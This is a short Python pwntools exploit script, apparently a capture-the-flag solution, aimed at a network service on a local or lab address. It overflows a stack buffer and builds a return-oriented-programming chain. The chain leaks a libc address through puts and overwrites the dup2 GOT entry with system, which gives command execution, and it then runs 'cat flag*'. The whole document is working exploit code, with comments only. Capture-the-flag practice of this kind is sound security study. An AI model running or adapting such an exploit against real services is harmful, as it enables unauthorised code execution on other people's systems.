from pwn import *

#r = remote('192.168.2.5', 1238)
r = remote('127.0.0.1', 1238)

r.recvuntil("Enter your data : \n")

# ROP - Call summary
# puts(0x601028)
# gets(0x601038) 
# gets(0x601040)
# dup2(0x601040) // with the remap it will be system(0x601040)

RBP = struct.pack("<Q", 0x0)             # POP RBP
RIP = struct.pack("<Q", 0x400998)        # RET -> To pop rdi gadget

ROP_CHAIN  = struct.pack("<Q", 0x601028) # POP RDI
ROP_CHAIN += struct.pack("<Q", 0x0)      # POP RBP
ROP_CHAIN += struct.pack("<Q", 0x400770) # RET -> To "puts"

ROP_CHAIN += struct.pack("<Q", 0x400998) # RET -> To pop rdi gadget

ROP_CHAIN += struct.pack("<Q", 0x601038) # POP RDI
ROP_CHAIN += struct.pack("<Q", 0x0)      # POP RBP
ROP_CHAIN += struct.pack("<Q", 0x400810) # RET -> To "gets"

ROP_CHAIN += struct.pack("<Q", 0x400998) # RET -> To pop rdi gadget

ROP_CHAIN += struct.pack("<Q", 0x601040) # POP RDI
ROP_CHAIN += struct.pack("<Q", 0x0)      # POP RBP
ROP_CHAIN += struct.pack("<Q", 0x400810) # RET -> To "gets"

ROP_CHAIN += struct.pack("<Q", 0x400998) # RET -> To pop rdi gadget

ROP_CHAIN += struct.pack("<Q", 0x601040) # POP RDI
ROP_CHAIN += struct.pack("<Q", 0x0)      # POP RBP
ROP_CHAIN += struct.pack("<Q", 0x4007a0) # RET -> To "dup2" which was remapped to "system"

r.send("A"*0x100 + RBP + RIP + ROP_CHAIN + "\n")

d = r.recv(1024)
addr = int(d.replace("\n", "")[::-1].encode("hex"), 16)
addr -= 210752 # Static offset, must be computed for the libc version in use.

r.send(struct.pack("<Q", addr) + "\n")
r.send("cat flag*\n")

while True:
	print(repr(r.recv(1024)))

r.interactive()